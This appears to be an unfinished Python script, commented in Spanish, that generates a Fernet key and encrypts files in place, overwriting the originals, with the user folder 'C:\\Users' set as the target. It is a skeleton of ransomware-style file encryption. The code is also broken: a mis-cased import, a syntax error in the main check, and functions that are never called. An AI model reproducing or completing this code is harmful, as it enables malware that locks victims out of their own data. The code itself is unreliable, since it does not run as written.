from cryptography.fernet import fernet
import os

def generateKey():
     '''
          Funcion 'Generar key' 
          Esta funcion nos genera un archivo con una contraseña      
     '''
     key = Fernet.generate_key()
     with open("key.key", "wb") as key_file:
          key_file.write(key)

def retornarkey():
     '''
          Funcion retornarkey 
          Nos retorna el valor del key
     '''
     return open("key.key", "rb").read()

def encryp(items, key):
     """
          Funcion encrypt 
          Nos ayuda a generar lo necesario para generar nuestra clave
     """
     i = Fernet(key)
     for x in items:
          with open(x, 'rb') as file:
               file_data = file.read()
          data = i.encrypt(file_data)
          with open(x, 'wb') as file:
               file.write(data)

if __name__ = "__main__":

     #En la siguiente linea se debe de escribir la ruta de los archivos a encryptar
     archivos = 'C:\\Users'
     
